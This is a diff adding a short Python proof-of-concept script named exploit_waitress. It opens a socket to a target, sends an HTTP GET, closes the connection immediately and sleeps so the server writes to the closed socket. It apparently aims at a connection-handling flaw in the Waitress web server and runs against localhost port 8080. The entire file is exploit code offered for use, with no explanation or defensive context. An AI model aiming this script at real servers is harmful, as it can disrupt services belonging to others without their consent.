@@ -1,0 +1,21 @@
+```python
+import socket
+import time
+
+def exploit_waitress(target_ip, target_port):
+    # Create a socket connection to the target
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((target_ip, target_port))
+    
+    # Send a request to the server
+    sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nConnection: close\r\n\r\n")
+    
+    # Close the connection immediately
+    sock.close()
+    
+    # Sleep to allow the server to attempt to write to the closed socket
+    time.sleep(0.1)
+
+# Example usage
+exploit_waitress('127.0.0.1', 8080)
+```
